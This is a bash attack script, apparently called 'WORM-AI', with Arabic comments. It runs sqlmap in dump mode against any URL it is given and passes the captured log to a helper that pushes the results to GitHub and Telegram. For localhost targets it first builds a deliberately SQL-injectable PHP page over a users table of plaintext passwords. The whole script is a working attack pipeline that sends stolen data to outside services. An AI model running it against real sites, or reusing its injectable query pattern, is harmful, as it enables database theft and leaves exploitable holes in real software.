#!/bin/bash
# WORM-AI Full Pipeline - Dynamic Target
# Usage: ./run_full_pipeline.sh [TARGET_URL]
# Example: ./run_full_pipeline.sh "http://example.com/page.php?id=1"

set -e

TARGET_URL="${1:-http://localhost:8080/vuln.php?id=1}"
echo "[WORM] 🎯 Target: $TARGET_URL"

# تحقق من المتغيرات البيئية
if [ -z "$GITHUB_TOKEN" ] || [ -z "$TELEGRAM_BOT_TOKEN" ] || [ -z "$TELEGRAM_CHAT_ID" ]; then
    echo "[WORM] ❌ Missing env vars. Set GITHUB_TOKEN, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID"
    exit 1
fi

# تنظيف الخادم المحلي فقط إذا كان الهدف هو localhost
if [[ "$TARGET_URL" == *"localhost"* ]]; then
    echo "[WORM] 🔧 Setting up local target..."
    pkill -f "php -S localhost:8080" 2>/dev/null || true
    cd ~/sqlmap-lab
    rm -f test.db vuln.php
    sqlite3 test.db <<< "CREATE TABLE users (id INTEGER, username TEXT, password TEXT); INSERT INTO users VALUES (1,'admin','123456'), (2,'user','password'), (3,'shadow','hackme');"
    echo '<?php $db = new SQLite3("test.db"); $id = $_GET["id"]; $res = $db->query("SELECT * FROM users WHERE id = $id"); while($row = $res->fetchArray(SQLITE3_ASSOC)) { echo "User: " . $row["username"] . " - Pass: " . $row["password"] . "<br>"; } ?>' > vuln.php
    php -S localhost:8080 > /dev/null 2>&1 &
    sleep 2
    cd ~/sqlmap-dev
fi

# تشغيل الهجوم
echo "[WORM] ⚡ Running sqlmap on $TARGET_URL ..."
python sqlmap.py -u "$TARGET_URL" --batch --dump > sqlmap_full.log 2>&1
echo "[WORM] ✅ Attack done."

# تحليل ورفع وإرسال
echo "[WORM] 🔍 Analyzing..."
python3 /root/sqlmap-dev/sqli_forensic_v3.py sqlmap_full.log --push --telegram --clean

# تنظيف الخادم المحلي
if [[ "$TARGET_URL" == *"localhost"* ]]; then
    pkill -f "php -S localhost:8080" 2>/dev/null || true
fi

echo "[WORM] 💀 Done. Remember to revoke your tokens."
